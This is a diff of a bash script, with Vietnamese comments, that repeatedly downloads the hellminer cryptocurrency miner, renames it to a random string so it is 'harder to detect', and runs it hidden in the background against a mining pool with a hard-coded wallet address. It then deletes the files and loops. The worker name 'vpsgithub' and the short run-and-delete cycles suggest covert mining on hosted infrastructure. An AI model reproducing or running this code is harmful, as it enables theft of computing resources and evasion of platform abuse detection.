@@ -1,54 +1,36 @@
 #!/bin/bash
 
-# Function to generate a strong random file name
+# Tạo một tên tệp ngẫu nhiên để khó phát hiện hơn
 generate_random_name() {
-  local random_name
-  random_name=$(date +%s%N | sha512sum | base64 | head -c 12)
-  echo "$random_name"
+  tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 12
 }
 
-# Function to encrypt the miner binary
-encrypt_miner_binary() {
-  local binary="$1"
-  local encrypted_binary="encrypted_$binary"
-
-  # Encrypt the binary using AES-256-CBC and SHA-512
-  openssl enc -aes-256-cbc -salt -in "$binary" -out "$encrypted_binary" -pbkdf2 -iter 100000 -md sha512
-
-  # Optionally, you can also generate a checksum or signature here if needed
-}
-
-# Main loop to continuously run the mining script
+# Vòng lặp vô hạn để script chạy liên tục
 while true; do
-  # Download the miner archive (adjust URL as necessary)
-  curl -fsSL -o hellminer_linux64_avx2.tar.gz https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
+  # Tải file
+  wget -q https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
 
-  # Extract the miner files
+  # Giải nén file
   tar -xf hellminer_linux64_avx2.tar.gz
-
-  # Clean up unnecessary files
-  rm -f hellminer_linux64_avx2.tar.gz run_miner.sh verus-solver
-
-  # Generate a random name for the miner binary
+  rm -f hellminer_linux64_avx2.tar.gz
+  rm -rf run_miner.sh
+  rm -rf verus-solver
+  # Đổi tên file để khó phát hiện hơn
   random_name=$(generate_random_name)
   mv hellminer "$random_name"
 
-  # Encrypt the miner binary
-  encrypt_miner_binary "$random_name"
-
-  # Run the miner in the background for 1 minute
-  nohup ./encrypted_"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgit --cpu 3 >/dev/null 2>&1 &
+  # Chạy chương trình trong 1 phút với tên đã đổi, ẩn danh và chạy ngầm
+  nohup ./"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgithub --cpu 2 >/dev/null 2>&1 &
   miner_pid=$!
-
-  # Wait for 1 minute while mining
   sleep 1m
 
-  # Stop the miner process
+  # Dừng chương trình
   kill $miner_pid
 
-  # Clean up downloaded files and encrypted miner binary
-  rm -f "$random_name" encrypted_"$random_name"
+  # Xóa các file đã tải và giải nén
+  rm -f hellminer_linux64_avx2.tar.gz
+  rm -rf "$random_name"
 
-  # Wait for 2 minutes before repeating the loop
+  # Nghỉ 1 phút trước khi lặp lại
   sleep 2m
 done
